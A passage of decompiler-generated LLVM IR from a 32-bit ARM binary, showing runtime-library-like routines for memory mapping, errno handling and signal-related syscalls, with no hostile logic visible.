  br i1 %v2_16b14, label %dec_label_pc_16b80, label %dec_label_pc_16b1c

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16b14
  %v0_16b1c = load i32, i32* %sl.global-to-local, align 4
  %v2_16b1c = mul i32 %v0_16b1c, 2
  %v2_16b20 = add i32 %v2_16b1c, %v0_16b14
  %v3_16b20 = inttoptr i32 %v2_16b20 to i16*
  %v4_16b20 = load i16, i16* %v3_16b20, align 2
  %tmp88 = urem i16 %v4_16b20, -32768
  %v3_16b28 = zext i16 %tmp88 to i32
  %v0_16b2c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16b2c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b44

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b50, %dec_label_pc_16b44
  %v1_16b34 = add i32 %v0_16b64, 16
  %v2_16b34 = inttoptr i32 %v1_16b34 to i32*
  %v3_16b34 = load i32, i32* %v2_16b34, align 4
  %v2_16b38 = icmp eq i32 %v3_16b34, 0
  %v2_16b3c = add i32 %v3_16b34, %v0_16b64
  store i32 %v2_16b3c, i32* %r1.global-to-local, align 4
  br i1 %v2_16b38, label %dec_label_pc_16aa8.loopexit, label %dec_label_pc_16b44

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b34, %dec_label_pc_16b1c
  %v0_16b64 = phi i32 [ %v2_16b3c, %dec_label_pc_16b34 ], [ %v0_16b2c, %dec_label_pc_16b1c ]
  %v1_16b44 = add i32 %v0_16b64, 2
  %v2_16b44 = inttoptr i32 %v1_16b44 to i16*
  %v3_16b44 = load i16, i16* %v2_16b44, align 2
  %tmp89 = urem i16 %v3_16b44, 2
  %v2_16b48 = icmp eq i16 %tmp89, 0
  br i1 %v2_16b48, label %dec_label_pc_16b50, label %dec_label_pc_16b34

dec_label_pc_16b50:                               ; preds = %dec_label_pc_16b44
  %v1_16b50 = add i32 %v0_16b64, 4
  %v2_16b50 = inttoptr i32 %v1_16b50 to i16*
  %v3_16b50 = load i16, i16* %v2_16b50, align 2
  %tmp90 = urem i16 %v3_16b50, -32768
  %v9_16b5c = icmp eq i16 %tmp90, %tmp88
  br i1 %v9_16b5c, label %dec_label_pc_16b64, label %dec_label_pc_16b34

dec_label_pc_16b64:                               ; preds = %dec_label_pc_16b50
  %v1_16b64 = add i32 %v0_16b64, 12
  %v2_16b64 = inttoptr i32 %v1_16b64 to i32*
  %v3_16b64 = load i32, i32* %v2_16b64, align 4
  %v2_16b68 = add i32 %v3_16b64, %v0_16b64
  %v3_16b68 = inttoptr i32 %v2_16b68 to i32*
  %v4_16b68 = load i32, i32* %v3_16b68, align 4
  %v0_16b6c = load i32, i32* %r7.global-to-local, align 4
  %v0_16b70 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b70 = add i32 %v0_16b70, %v4_16b68
  store i32 %v2_16b70, i32* %r1.global-to-local, align 4
  %v4_16b74 = inttoptr i32 %v0_16b6c to i8*
  %v5_16b74 = call i32 @function_16f74(i8* %v4_16b74, i32 %v2_16b70, i32 %v3_16b28, i32 %v3_16b64)
  %v2_16b78 = icmp eq i32 %v5_16b74, 0
  br i1 %v2_16b78, label %dec_label_pc_16b80, label %dec_label_pc_16aa8

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b64, %dec_label_pc_16b14
  %v0_16b80 = load i32, i32* %r4.global-to-local, align 4
  %v1_16b80 = add i32 %v0_16b80, 4
  %v2_16b80 = inttoptr i32 %v1_16b80 to i32*
  %v3_16b80 = load i32, i32* %v2_16b80, align 4
  %v0_16b84 = load i32, i32* %r5.global-to-local, align 4
  %v2_16b84 = add i32 %v0_16b84, %v3_16b80
  br label %dec_label_pc_169d0

; uselistorder directives
  uselistorder i32 %v3_16b64, { 1, 0 }
  uselistorder i32 %v0_16b64, { 0, 1, 4, 5, 3, 2 }
  uselistorder i16 %v3_16af0, { 1, 0 }
  uselistorder i32 %v3_16adc, { 1, 0 }
  uselistorder i32 %v2_16a38, { 4, 5, 8, 7, 6, 3, 2, 0, 1 }
  uselistorder i32 %v0_16a58, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16a6448, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16a6850, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a7853, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a8455, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_169a8, { 1, 2, 0 }
  uselistorder i32 %v0_169b8, { 1, 0, 2 }
  uselistorder i32 %v0_169b0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_16950, { 1, 0 }
  uselistorder i32 %v0_16950, { 0, 2, 1 }
  uselistorder i32 %v2_16910, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 10, 9, 2, 11, 12, 13, 14, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 14, { 17, 0, 1, 18, 9, 3, 4, 5, 6, 7, 10, 11, 8, 12, 13, 14, 15, 2, 16 }
  uselistorder i32 39, { 0, 6, 5, 1, 7, 2, 8, 3, 9, 4 }
  uselistorder i8 16, { 1, 2, 0, 3, 4, 5, 6, 8, 7, 10, 9, 11, 12, 14, 13, 16, 15 }
  uselistorder i32 42, { 3, 2, 0, 4, 1, 5 }
  uselistorder i16 0, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %dec_label_pc_16aa8, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb75, { 5, 3, 0, 2, 6, 4, 1 }
  uselistorder label %dec_label_pc_169d0, { 11, 0, 10, 9, 2, 5, 8, 3, 1, 6, 7, 4 }
  uselistorder label %.thread4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16958, { 1, 0 }
}

define i32 @function_16b90(i32* %arg1) local_unnamed_addr {
dec_label_pc_16b90:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8388636 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_16b90 = load i32, i32* @r6, align 4
  %v12_16b90 = load i32, i32* @r7, align 4
  %v15_16b90 = load i32, i32* @r8, align 4
  %v18_16b90 = load i32, i32* @lr, align 4
  %v2_16b94 = load i32, i32* %arg1, align 4
  store i32 %v2_16b94, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %tmp42 = icmp ugt i32 %v2_16b94, 2147479551
  br i1 %tmp42, label %dec_label_pc_16cf4, label %dec_label_pc_16bb0

dec_label_pc_16bb0:                               ; preds = %dec_label_pc_16b90
  store i32 ptrtoint (i32* @global_var_2293c.655 to i32), i32* @lr, align 4
  %v1_16bb4 = sub i32 0, %v2_16b94
  %v2_16bb8 = load i32, i32* @global_var_2293c.655, align 4
  store i32 %v2_16bb8, i32* %r0.global-to-local, align 4
  %v3_16bc0 = urem i32 %v1_16bb4, 4096
  %v2_16bc4 = icmp eq i32 %v2_16bb8, 0
  %v2_16bc8 = add i32 %v3_16bc0, %v2_16b94
  br i1 %v2_16bc4, label %dec_label_pc_16c88, label %dec_label_pc_16bd0

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16bb0, %dec_label_pc_16c88
  %v2_16cd0 = phi i32 [ %v2_16bb8, %dec_label_pc_16bb0 ], [ 0, %dec_label_pc_16c88 ]
  %v1_16bd4 = sub i32 -1, %v2_16cd0
  %v3_16bd8 = icmp ult i32 %v2_16bc8, %v1_16bd4
  br i1 %v3_16bd8, label %dec_label_pc_16be0, label %dec_label_pc_16c10

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16bd0
  %v3_16be4 = load i32, i32* @global_var_22b3c.530, align 4
  %v1_16be8 = add i32 %v3_16be4, -8388608
  %v2_16be8 = icmp ugt i32 %v3_16be4, 8388607
  %v7_16be8 = icmp eq i32 %v3_16be4, 8388608
  %v2_16bec = xor i1 %v2_16be8, true
  %v3_16bec = or i1 %v7_16be8, %v2_16bec
  br i1 %v3_16bec, label %bb, label %bb31

bb:                                               ; preds = %dec_label_pc_16be0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_16be0, %bb
  %v0_16bf812 = phi i32 [ %v2_16b94, %dec_label_pc_16be0 ], [ 0, %bb ]
  %v2_16bf0 = xor i1 %v7_16be8, true
  %v3_16bf0 = and i1 %v2_16be8, %v2_16bf0
  br i1 %v3_16bf0, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  store i32 %v1_16be8, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v0_16bf8 = phi i32 [ %v0_16bf812, %bb31 ], [ %v1_16be8, %bb32 ]
  %v2_16bf4 = add i32 %v2_16cd0, %v2_16bc8
  store i32 %v2_16bf4, i32* %r0.global-to-local, align 4
  %v3_16bf8 = icmp ult i32 %v0_16bf8, %v2_16bf4
  br i1 %v3_16bf8, label %bb34, label %bb35

bb34:                                             ; preds = %bb33
  %v4_16bfc = icmp ult i32 %v2_16cd0, %v3_16be4
  store i32 %v3_16be4, i32* %stack_var_-28, align 4
  br i1 %v4_16bfc, label %.thread3, label %dec_label_pc_16ca8

bb35:                                             ; preds = %bb33
  store i32 %v3_16be4, i32* %stack_var_-28, align 4
  br label %dec_label_pc_16ca8

.thread3:                                         ; preds = %bb34
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16c10

dec_label_pc_16c10:                               ; preds = %dec_label_pc_16cc0, %dec_label_pc_16bd0, %.thread3
  store i32 ptrtoint (i32* @global_var_22938.658 to i32), i32* @r6, align 4
  %v2_16c14 = load i32, i32* @global_var_22938.658, align 4
  %v3_16c1c = udiv i32 %v2_16c14, 2
  %v6_16c20 = shl i32 4096, %v3_16c1c
  %v3_16c24 = icmp uge i32 %v2_16bc8, %v6_16c20
  %v2_16bc8.v6_16c20 = select i1 %v3_16c24, i32 %v2_16bc8, i32 %v6_16c20
  store i32 %v2_16bc8.v6_16c20, i32* @r7, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v7_16c58 = call i32 @function_14644(i32 0, i32 %v2_16bc8.v6_16c20, i32 3, i32 34, i32 -1, i32 0, i32 0)
  store i32 %v7_16c58, i32* %r0.global-to-local, align 4
  %v7_16c5c = icmp eq i32 %v7_16c58, -1
  br i1 %v7_16c5c, label %bb38, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_16c10
  %v1_16c60 = load i32, i32* @r7, align 4
  %v2_16c60 = load i32, i32* @r8, align 4
  %v3_16c60 = inttoptr i32 %v2_16c60 to i32*
  store i32 %v1_16c60, i32* %v3_16c60, align 4
  %v3_16c64 = load i32, i32* @global_var_22938.658, align 4
  %v2_16c68 = add i32 %v3_16c64, 1
  %v2_16c6c = load i32, i32* @r6, align 4
  %v3_16c6c = inttoptr i32 %v2_16c6c to i32*
  store i32 %v2_16c68, i32* %v3_16c6c, align 4
  store i32 %v7_16c58, i32* %r2.global-to-local, align 4
  br label %bb39

bb38:                                             ; preds = %dec_label_pc_16c10
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb39

bb39:                                             ; preds = %.thread7, %dec_label_pc_16cf4, %dec_label_pc_16ce0, %bb38
  %v0_16c78 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16c78, i32* %r0.global-to-local, align 4
  store i32 %v9_16b90, i32* @r6, align 4
  store i32 %v12_16b90, i32* @r7, align 4
  store i32 %v15_16b90, i32* @r8, align 4
  store i32 %v18_16b90, i32* @lr, align 4
  ret i32 %v0_16c78

dec_label_pc_16c88:                               ; preds = %dec_label_pc_16bb0
  store i32 0, i32* @global_var_2293c.655, align 4
  br label %dec_label_pc_16bd0

dec_label_pc_16ca8:                               ; preds = %bb34, %bb35
  %v2_16ca8 = ptrtoint i32* %stack_var_-28 to i32
  %v2_16cac = icmp ugt i32* %stack_var_-28, inttoptr (i32 8388607 to i32*)
  %v2_16cb0 = icmp ne i32* %stack_var_-28, inttoptr (i32 8388608 to i32*)
  %v3_16cb0 = and i1 %v2_16cac, %v2_16cb0
  br i1 %v3_16cb0, label %bb40, label %bb41

bb40:                                             ; preds = %dec_label_pc_16ca8
  %v6_16cb0 = ptrtoint i32* %stack_var_-8388636 to i32
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_16ca8, %bb40
  %storemerge = phi i32 [ %v6_16cb0, %bb40 ], [ 0, %dec_label_pc_16ca8 ]
  %v0_16cb4 = phi i32 [ %v6_16cb0, %bb40 ], [ 0, %dec_label_pc_16ca8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_16cb4 = icmp ult i32 %v0_16cb4, %v2_16bf4
  store i32 %v2_16ca8, i32* %stack_var_-28, align 4
  br i1 %v3_16cb4, label %dec_label_pc_16cc0, label %dec_label_pc_16ce0

dec_label_pc_16cc0:                               ; preds = %bb41
  %v3_16cc0 = icmp ult i32 %v2_16cd0, %v2_16ca8
  br i1 %v3_16cc0, label %dec_label_pc_16c10, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cc0, %bb41
  store i32 %v2_16cd0, i32* %r2.global-to-local, align 4
  store i32 %v2_16bc8, i32* %arg1, align 4
  %v0_16cec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16cec, i32* @global_var_2293c.655, align 4
  br label %bb39

dec_label_pc_16cf4:                               ; preds = %dec_label_pc_16b90
  %v0_16cf4 = call i32 @function_12f18()
  store i32 %v0_16cf4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_16d00 = inttoptr i32 %v0_16cf4 to i32*
  store i32 12, i32* %v2_16d00, align 4
  br label %bb39

; uselistorder directives
  uselistorder i32 %v7_16c58, { 1, 0, 2 }
  uselistorder i1 %v2_16be8, { 1, 0 }
  uselistorder i32 %v3_16be4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v2_16cd0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_16bc8, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v2_16b94, { 2, 1, 3, 0, 4 }
  uselistorder i32* %stack_var_-28, { 3, 0, 2, 5, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 5, 4, 6, 7, 1, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 1, 7, 3, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_14644, { 1, 0 }
  uselistorder i32 34, { 0, 2, 8, 3, 4, 9, 16, 1, 12, 10, 11, 5, 13, 6, 14, 7, 15 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_16ca8, { 1, 0 }
  uselistorder label %bb39, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16c10, { 0, 2, 1 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_16bd0, { 1, 0 }
}

define i32 @function_16d14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16d14:
  %v0_16d24 = load i32, i32* @r3, align 4
  store i32 %v0_16d24, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @function_16d38(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d38:
  %v0_16d48 = load i32, i32* @r0, align 4
  %v3_16d48 = inttoptr i32 %v0_16d48 to i16*
  %v4_16d48 = call i32 @function_1513c(i16* %v3_16d48, i32 ptrtoint (i32* @global_var_22944.660 to i32), i32 8)
  ret i32 %v4_16d48
}

define i32 @function_16d5c() local_unnamed_addr {
dec_label_pc_16d5c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16d5c = load i32, i32* @r4, align 4
  %v6_16d5c = load i32, i32* @r5, align 4
  %v12_16d5c = load i32, i32* @r7, align 4
  %v15_16d5c = load i32, i32* @r8, align 4
  %v18_16d5c = load i32, i32* @lr, align 4
  %v0_16d60 = load i32, i32* @r0, align 4
  store i32 %v0_16d60, i32* @r8, align 4
  %v0_16d6c = load i32, i32* @r1, align 4
  store i32 %v0_16d6c, i32* @r7, align 4
  %v0_16d70 = load i32, i32* @r2, align 4
  store i32 %v0_16d70, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_16d60, 65
  br i1 %tmp, label %dec_label_pc_16d8c, label %dec_label_pc_16d78

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16d5c
  %v0_16d78 = call i32 @function_12f18()
  store i32 -1, i32* @r2, align 4
  %v2_16d84 = inttoptr i32 %v0_16d78 to i32*
  store i32 22, i32* %v2_16d84, align 4
  %v0_16ec8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d5c
  %v2_16d8c = icmp eq i32 %v0_16d6c, 0
  br i1 %v2_16d8c, label %bb, label %dec_label_pc_16d98

bb:                                               ; preds = %dec_label_pc_16d8c
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_16e68

dec_label_pc_16d98:                               ; preds = %dec_label_pc_16d8c
  %v1_16d98 = inttoptr i32 %v0_16d6c to i32*
  %v2_16d98 = load i32, i32* %v1_16d98, align 4
  %v7_16d9c = icmp eq i32 %v2_16d98, 1
  store i1 %v7_16d9c, i1* @cpsr_z, align 1
  %tmp31 = or i32 %v2_16d98, 1
  %tmp32 = icmp eq i32 %tmp31, 1
  br i1 %tmp32, label %dec_label_pc_16e28, label %dec_label_pc_16da4

dec_label_pc_16da4:                               ; preds = %dec_label_pc_16d98
  %v1_16da4 = add i32 %v0_16d60, -1
  %v1_16da8 = urem i32 %v1_16da4, 32
  %v6_16db0 = shl i32 1, %v1_16da8
  store i32 %v6_16db0, i32* %r5.global-to-local, align 4
  %v3_16db8 = udiv i32 %v1_16da4, 32
  %v4_16dbc = mul nuw nsw i32 %v3_16db8, 4
  %v5_16dbc = add i32 %v4_16dbc, ptrtoint (i32* @global_var_22944.660 to i32)
  store i32 %v5_16dbc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16dc0.dec_label_pc_16dc0_crit_edge, %dec_label_pc_16da4
  %v1_16dc8 = phi i32 [ %v1_16dc8.pre, %dec_label_pc_16dc0.dec_label_pc_16dc0_crit_edge ], [ %v6_16db0, %dec_label_pc_16da4 ]
  %v0_16dc0 = phi i32 [ %v0_16dc0.pre, %dec_label_pc_16dc0.dec_label_pc_16dc0_crit_edge ], [ %v5_16dbc, %dec_label_pc_16da4 ]
  %v1_16dc0 = inttoptr i32 %v0_16dc0 to i32*
  %v2_16dc0 = load i32, i32* %v1_16dc0, align 4
  %v2_16dc8 = or i32 %v2_16dc0, %v1_16dc8
  %v4_16dcc = call i32 @function_15d38(i32 %v2_16dc0, i32 %v2_16dc8, i32* %v1_16dc0)
  %v2_16dd0 = icmp eq i32 %v4_16dcc, 0
  store i1 %v2_16dd0, i1* @cpsr_z, align 1
  br i1 %v2_16dd0, label %dec_label_pc_16dd8, label %dec_label_pc_16dc0.dec_label_pc_16dc0_crit_edge

dec_label_pc_16dc0.dec_label_pc_16dc0_crit_edge:  ; preds = %dec_label_pc_16dc0
  %v0_16dc0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16dc8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16dc0
  %v3_16ddc = load i32, i32* @global_var_22b30.663, align 4
  %v2_16de0 = icmp eq i32 %v3_16ddc, 0
  br i1 %v2_16de0, label %dec_label_pc_16de8, label %dec_label_pc_16e28

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16dd8
  store i32 ptrtoint (i32* @global_var_22940.665 to i32), i32* %r4.global-to-local, align 4
  %v2_16dec = load i32, i32* @global_var_22940.665, align 4
  %v2_16df0 = icmp eq i32 %v2_16dec, 0
  br i1 %v2_16df0, label %dec_label_pc_16df8, label %dec_label_pc_16e28

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16de8
  store i32 0, i32* @r3, align 4
  %v2_16e10 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_16e10, i32* @r2, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v2_16e1c = call i32 @function_16d14(i32 175, i32 1)
  %v1_16e24 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e24 = inttoptr i32 %v1_16e24 to i32*
  store i32 1, i32* %v2_16e24, align 4
  br label %dec_label_pc_16e28

dec_label_pc_16e28:                               ; preds = %dec_label_pc_16de8, %dec_label_pc_16dd8, %dec_label_pc_16d98, %dec_label_pc_16df8
  %v0_16e28 = load i32, i32* @r7, align 4
  %v1_16e28 = add i32 %v0_16e28, 132
  %v2_16e28 = inttoptr i32 %v1_16e28 to i32*
  %v3_16e28 = load i32, i32* %v2_16e28, align 4
  store i32 94548, i32* @r3, align 4
  store i32 94540, i32* @ip, align 4
  %v1_16e34 = inttoptr i32 %v0_16e28 to i32*
  %v2_16e34 = load i32, i32* %v1_16e34, align 4
  store i32 %v2_16e34, i32* @r5, align 4
  %v1_16e38 = and i32 %v3_16e28, 4
  %v2_16e38 = icmp eq i32 %v1_16e38, 0
  %v2_16e3c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_16e3c, i32* @r4, align 4
  br i1 %v2_16e38, label %bb25, label %bb24

bb24:                                             ; preds = %dec_label_pc_16e28
  store i32 94548, i32* @ip, align 4
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_16e28, %bb24
  %v1_16e44 = or i32 %v3_16e28, 67108864
  store i32 %v1_16e44, i32* @lr, align 4
  %v1_16e4c = add i32 %v0_16e28, 4
  store i32 %v2_16e34, i32* %stack_var_-52, align 4
  %v3_16e60 = bitcast i32* %stack_var_-40 to i16*
  %v4_16e60 = call i32 @function_1513c(i16* %v3_16e60, i32 %v1_16e4c, i32 8)
  store i32 %v2_16e3c, i32* @r2, align 4
  %v0_16e68.pre = load i32, i32* @r6, align 4
  %v0_16e74.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16e68

dec_label_pc_16e68:                               ; preds = %bb, %bb25
  %v0_16e74 = phi i32 [ %v0_16d60, %bb ], [ %v0_16e74.pre, %bb25 ]
  %v1_16e6c = phi i32 [ %v0_16d70, %bb ], [ %v0_16e68.pre, %bb25 ]
  %v2_16e68 = icmp eq i32 %v1_16e6c, 0
  %v3_16e70 = ptrtoint i32* %stack_var_-72 to i32
  %storemerge = select i1 %v2_16e68, i32 0, i32 %v3_16e70
  store i32 %storemerge, i32* @r3, align 4
  store i32 8, i32* @r5, align 4
  %v2_16e84 = call i32 @function_16d14(i32 174, i32 %v0_16e74)
  store i32 %v2_16e84, i32* @r0, align 4
  %v0_16e88 = call i32 @function_131c4()
  store i32 %v0_16e88, i32* @r4, align 4
  %v2_16e8c = icmp eq i32 %v0_16e88, 0
  br i1 %v2_16e8c, label %dec_label_pc_16e98, label %bb28

bb28:                                             ; preds = %dec_label_pc_16e68
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e68
  %v0_16e98 = load i32, i32* @r6, align 4
  %v2_16e98 = icmp eq i32 %v0_16e98, 0
  br i1 %v2_16e98, label %bb29, label %dec_label_pc_16ea4

bb29:                                             ; preds = %dec_label_pc_16e98
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e98
  %v3_16ea8 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_16ea8, i32* @r3, align 4
  %v1_16eac = add i32 %v0_16e98, 4
  %v2_16eb0 = add i32 %v0_16e98, 132
  %v3_16eb0 = inttoptr i32 %v2_16eb0 to i32*
  %v0_16eb4 = load i32, i32* @r3, align 4
  %v1_16eb4 = load i32, i32* @r6, align 4
  %v2_16eb4 = inttoptr i32 %v1_16eb4 to i32*
  store i32 %v0_16eb4, i32* %v2_16eb4, align 4
  %v0_16eb8 = load i32, i32* @r5, align 4
  %v2_16ebc = ptrtoint i32* %stack_var_-60 to i32
  %v3_16ec0 = inttoptr i32 %v1_16eac to i16*
  %v4_16ec0 = call i32 @function_1513c(i16* %v3_16ec0, i32 %v2_16ebc, i32 %v0_16eb8)
  %v0_16ec4 = load i32, i32* @r4, align 4
  store i32 %v0_16ec4, i32* @r2, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %bb29, %bb28, %dec_label_pc_16d78, %dec_label_pc_16ea4
  %v0_16ec8 = phi i32 [ -1, %bb28 ], [ 0, %bb29 ], [ %v0_16ec8.pre, %dec_label_pc_16d78 ], [ %v0_16ec4, %dec_label_pc_16ea4 ]
  store i32 %v3_16d5c, i32* %r4.global-to-local, align 4
  store i32 %v6_16d5c, i32* %r5.global-to-local, align 4
  store i32 %v12_16d5c, i32* @r7, align 4
  store i32 %v15_16d5c, i32* @r8, align 4
  store i32 %v18_16d5c, i32* @lr, align 4
  ret i32 %v0_16ec8

; uselistorder directives
  uselistorder i32 %v0_16e98, { 1, 0, 2 }
  uselistorder i32 %v2_16dc0, { 1, 0 }
  uselistorder i32 %v0_16d60, { 1, 2, 0, 3 }
  uselistorder i32 174, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @function_1513c, { 3, 4, 0, 11, 9, 7, 8, 1, 2, 6, 5, 10 }
  uselistorder i32 (i32, i32)* @function_16d14, { 1, 0 }
  uselistorder label %dec_label_pc_16ec8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16e68, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_16e28, { 3, 0, 1, 2 }
}

define i32 @function_16eec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_16eec:
  store i32 %arg1, i32* @r0, align 4
  %v1_16ef0 = add i32 %arg1, -32
  %tmp = icmp ult i32 %v1_16ef0, 3
  br i1 %tmp, label %dec_label_pc_16f0c, label %dec_label_pc_16f00

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16eec
  %v0_16f08 = call i32 @function_16d5c()
  br label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16eec, %dec_label_pc_16f00
  %v0_16f0c = call i32 @function_12f18()
  %v2_16f14 = inttoptr i32 %v0_16f0c to i32*
  store i32 22, i32* %v2_16f14, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 22, { 1, 2, 4, 3, 0, 18, 5, 20, 6, 7, 14, 8, 15, 9, 16, 10, 17, 19, 11, 12, 13, 21 }
  uselistorder i32 ()* @function_12f18, { 37, 36, 17, 30, 29, 28, 27, 26, 38, 35, 34, 16, 15, 14, 13, 5, 12, 11, 4, 31, 25, 24, 23, 22, 21, 20, 19, 10, 33, 32, 18, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16f0c, { 1, 0 }
}

define i32 @function_16f28(i32 %arg1) local_unnamed_addr {
dec_label_pc_16f28:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  store i32 %arg1, i32* @r4, align 4
  %v0_16f34 = call i32 @function_1715c()
  store i32 %v0_16f34, i32* %r0.global-to-local, align 4
  %v2_16f38 = icmp eq i32 %v0_16f34, 0
  br i1 %v2_16f38, label %dec_label_pc_16f40, label %dec_label_pc_16f68

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f28
  %v0_16f40 = load i32, i32* @r4, align 4
  store i32 %v0_16f40, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v1_16f4c = add i32 %v0_16f40, 32
  %v2_16f4c = inttoptr i32 %v1_16f4c to i32*
  %v3_16f4c = load i32, i32* %v2_16f4c, align 4
  store i32 %v3_16f4c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_16f4c)
  %v0_16f58 = load i32, i32* %r0.global-to-local, align 4
  %v7_16f58 = icmp eq i32 %v0_16f58, 1
  br i1 %v7_16f58, label %bb, label %dec_label_pc_16f68

bb:                                               ; preds = %dec_label_pc_16f40
  %v4_16f5c = load i8, i8* %stack_var_-9, align 1
  %v5_16f5c = sext i8 %v4_16f5c to i32
  br label %dec_label_pc_16f68

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16f28, %dec_label_pc_16f40, %bb
  %storemerge = phi i32 [ %v5_16f5c, %bb ], [ -1, %dec_label_pc_16f40 ], [ -1, %dec_label_pc_16f28 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1 }
